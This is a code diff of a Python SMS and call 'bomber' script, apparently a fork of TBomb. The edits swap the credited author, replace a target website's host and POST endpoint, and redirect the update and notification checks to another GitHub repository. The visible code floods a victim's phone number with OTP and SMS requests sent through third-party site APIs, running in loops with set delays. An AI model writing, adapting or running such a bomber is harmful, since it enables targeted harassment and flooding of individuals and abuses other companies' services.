@@ -20,7 +20,7 @@ except ImportError:
 
 colors=['\033[1;31m','\033[1;32m','\033[1;33m','\033[1;34m','\033[1;35m','\033[1;36m']
 W='\033[0m'
-# The Credit For This Code Goes To SpeedX And All Other Contributors Listed At https://github.com/TheSpeedX/TBomb
+# The Credit For This Code Goes To hacker-bombing And All Other Contributors Listed At https://github.com/abi420/callsmsbombing
 # If You Wanna Take Credits For This Code, Please Look Yourself Again
 
 country_codes = {
@@ -274,7 +274,7 @@ def infinite(pn, dl, ch, max):
             continue
         os.system('rm proc.xxx >/dev/null 2>&1')
         count_inf += 1
-        # os.system('echo SpeedX >> count.xxx')
+        # os.system('echo abi420 >> count.xxx')
         time.sleep(float(dl))
         if (count_inf > maxlim):
             exit()
@@ -332,16 +332,16 @@ def getapi(pn,lim,cc):
         'PHPSESSID': 'm5tap7nr75b2ehcn8ur261oq86',
         }
         headers={
-            'Host': 'www.heromotocorp.com',
+            'Host': 'www.cyberheros.com',
             'Connection': 'keep-alive',
             'Content-Length': '126',
             'Accept': '*/*',
-            'Origin': 'https://www.heromotocorp.com',
+            'Origin': 'https://www.cyberheros.com',
             'X-Requested-With': 'XMLHttpRequest',
             'Save-Data': 'on',
             'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36',
             'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
-            'Referer': 'https://www.heromotocorp.com/en-in/xpulse200/',
+            'Referer': 'https://www.cyberheros.com/en-in/xpulse200/',
             'Accept-Encoding': 'gzip, deflate, br',
             'Accept-Language': 'en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6',
             }
@@ -353,7 +353,7 @@ def getapi(pn,lim,cc):
           'csrf': '523bc3fa1857c4df95e4d24bbd36c61b'
         }
 
-        response = requests.post('https://www.heromotocorp.com/en-in/xpulse200/ajax_data.php', headers=headers, cookies=cookies, data=data)
+        response = requests.post('https://www.cyberheros.com/en-in/xpulse200/ajax_data.php', headers=headers, cookies=cookies, data=data)
 
         return response.status_code==200
     elif lim == 5:
@@ -741,7 +741,7 @@ def start(target, counter, delay, ch, cc):
         print("             Failed Requests         : ", failed)
         print("==================================================================")
         print("              Use this for fun, not for revenge !!                ")
-        print("              This Bomber Was Created By SpeedX !!                ")
+        print("              This Bomber Was Created By Hacker ki jan hussna TRICKER !!                ")
         print("==================================================================")
         try:
             result = getapi(target, api, cc)
@@ -785,7 +785,7 @@ except Exception:
     exit()
 print('\tChecking For Updates...')
 ver = urllib.request.urlopen(
-    "https://raw.githubusercontent.com/TheSpeedX/TBomb/master/.version").read().decode('utf-8')
+    "https://raw.githubusercontent.com/abi420/callsmsbombing/master/.version").read().decode('utf-8')
 verl = ''
 try:
     verl = open(".version", 'r').read()
@@ -799,7 +799,7 @@ print("Your Version is Up-To-Date")
 print('\n\n\t\t\tStarting TBomb...\n\n')
 try:
     noti = urllib.request.urlopen(
-        "https://raw.githubusercontent.com/TheSpeedX/TBomb/master/.notify").read().decode('utf-8')
+        "https://raw.github.com/abi420/callsmsbombing/master/.notify").read().decode('utf-8')
     noti = noti.upper().strip()
     if len(noti) > 10:
         print('\n\n\tNOTIFICATION: ' + noti + '\n\n')
@@ -907,7 +907,7 @@ if nm == 0:
     print("             Delay               : ", dl)
     print("==================================================================")
     print("              Use this for fun, not for revenge !!                ")
-    print("              This Bomber Was Created By SpeedX !!                ")
+    print("              This Bomber Was Created By hacker ki jan Hussna TRICKER !!                ")
     print("==================================================================")
     print(W)
     input('\n\nPress CTRL+Z To STOP Bomber... \nPress Enter To Start Bomber...\n')
